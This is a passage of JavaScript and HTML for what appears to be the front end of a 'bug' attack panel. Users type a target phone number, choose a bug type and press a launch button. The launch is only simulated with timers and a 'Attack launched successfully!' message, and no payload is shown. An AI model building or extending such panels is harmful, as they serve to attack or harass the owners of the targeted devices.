                        '<div class="notification-cross-line2"></div>' +
                    '</div>' +
                '</div>' +
            '</div>' +
            '<h2 class="notification-title error">' + title + '</h2>' +
            '<p class="notification-message">' + message + '</p>' +
            '<button class="notification-btn error" onclick="closeNotification()">OK</button>' +
        '</div>';
    
    notificationContainer.appendChild(notification);
    
    // Auto close after 5 seconds
    setTimeout(() => {
        closeNotification();
    }, 5000);
}

// Function to close notification
function closeNotification() {
    const notificationContainer = document.getElementById('notificationContainer');
    const notification = notificationContainer.querySelector('.notification-overlay');
    
    if (notification) {
        notification.style.animation = 'fadeOut 0.3s ease';
        
        setTimeout(() => {
            notificationContainer.innerHTML = '';
        }, 300);
    }
}

// Bug Selection System
const bugTriggerBtn = document.getElementById('bugTriggerBtn');
const bugOptionsContainer = document.getElementById('bugOptionsContainer');
const selectedBugDisplay = document.getElementById('selectedBugDisplay');
const selectedBugText = document.getElementById('selectedBugText');
const terminalCommand = document.getElementById('terminalCommand');
const terminalOutput = document.getElementById('terminalOutput');
const terminalReady = document.getElementById('terminalReady');
const bugOptionBtns = document.querySelectorAll('.bug-option-btn');

let selectedBugMode = null;

// Toggle bug options visibility
bugTriggerBtn.addEventListener('click', function() {
    bugOptionsContainer.classList.toggle('active');
    bugTriggerBtn.classList.toggle('active');
});

// Handle bug selection with ripple effect
bugOptionBtns.forEach(btn => {
    // ripple on click
    btn.addEventListener('click', function(e) {
        // ripple element
        const r = document.createElement('span');
        r.className = 'ripple';
        const rect = this.getBoundingClientRect();
        const size = Math.max(rect.width, rect.height);
        r.style.width = r.style.height = size + 'px';
        r.style.left = (e.clientX - rect.left - size/2) + 'px';
        r.style.top = (e.clientY - rect.top - size/2) + 'px';
        this.appendChild(r);
        setTimeout(()=> r.remove(), 700);

        // selection logic (visual)
        document.querySelectorAll('.bug-option-btn').forEach(b => b.classList.remove('selected'));
        this.classList.add('selected');

        // Terminal-style animation
        const mode = this.getAttribute('data-mode');
        const text = this.textContent;
        selectedBugMode = mode;
        
        // Show terminal display
        selectedBugDisplay.classList.add('active');
        
        // Reset terminal text
        terminalCommand.textContent = '';
        terminalOutput.textContent = '';
        selectedBugText.textContent = '';
        terminalReady.textContent = '';
        
        // Remove finished class from previous animations
        terminalCommand.classList.remove('finished');
        terminalOutput.classList.remove('finished');
        terminalReady.classList.remove('finished');
        
        // Animate terminal typing
        typeTerminalText(terminalCommand, 'select_bug --active', 50, () => {
            // Add finished class to remove cursor
            terminalCommand.classList.add('finished');
            setTimeout(() => {
                typeTerminalText(terminalOutput, 'Bug selected successfully', 40, () => {
                    // Add finished class to remove cursor
                    terminalOutput.classList.add('finished');
                    setTimeout(() => {
                        selectedBugText.textContent = text;
                        // Update trigger button text
                        bugTriggerBtn.querySelector('span').textContent = text;
                        
                        // Tampilkan READY setelah bug terpilih
                        setTimeout(() => {
                            typeTerminalText(terminalReady, 'READY', 30, () => {
                                // Add finished class to remove cursor
                                terminalReady.classList.add('finished');
                            });
                        }, 1000);
                        
                    }, 300);
                });
            }, 300);
        });
        
        // Close options container
        bugOptionsContainer.classList.remove('active');
        bugTriggerBtn.classList.remove('active');
        this.focus();
    });

    // keyboard support: Enter or Space
    btn.addEventListener('keydown', function(e){
        if(e.key === 'Enter' || e.key === ' '){
            e.preventDefault();
            this.click();
        }
    });
});

// Terminal typing animation function
function typeTerminalText(element, text, speed, callback) {
    let i = 0;
    element.textContent = '';
    
    function type() {
        if (i < text.length) {
            element.textContent += text.charAt(i);
            i++;
            setTimeout(type, speed);
        } else if (callback) {
            setTimeout(callback, 200);
        }
    }
    
    type();
}

// Form submission dengan notifikasi keren
const actionBtn = document.getElementById('launchAttackBtn');

actionBtn.addEventListener('click', () => {
    const targetInput = document.querySelector('.input-box');
    
    if (targetInput.value.trim() === '') {
        showErrorNotification("INPUT ERROR", "Please enter a target number!");
        targetInput.focus();
        return;
    }
    
    if (!selectedBugMode) {
        showErrorNotification("SELECTION ERROR", "Please select a bug type!");
        bugTriggerBtn.focus();
        return;
    }
    
    // Simulate loading
    const originalText = actionBtn.innerHTML;
    actionBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> LAUNCHING...';
    actionBtn.disabled = true;
    
    setTimeout(() => {
        // Show success notification dengan animasi keren
        showSuccessNotification("SUCCESS SEND", "Attack launched successfully!");
        
        // Reset button setelah notifikasi ditutup
        setTimeout(() => {
            actionBtn.innerHTML = originalText;
            actionBtn.disabled = false;
        }, 2000);
        
    }, 2000);
});

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    updateCurrentTime();
    
    // Update time every second
    setInterval(updateCurrentTime, 1000);
    
    // Close sidebar when clicking on a link (for mobile)
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', function() {
            if (window.innerWidth < 1024) {
                toggleSidebar();
            }
        });
    });
});
</script>
  
  <!-- Ripple effect CSS -->
  <style>
    .ripple { 
      position:absolute; 
      border-radius:50%; 
      transform:scale(0); 
      background: rgba(255,255,255,0.12); 
      pointer-events:none; 
      animation: rippleAnim .7s ease-out; 
      z-index:3; 
    }
    @keyframes rippleAnim { 
      to { 
        transform: scale(1); 
        opacity:0; 
      } 
    }
  </style>
</body>
</html>`;
};



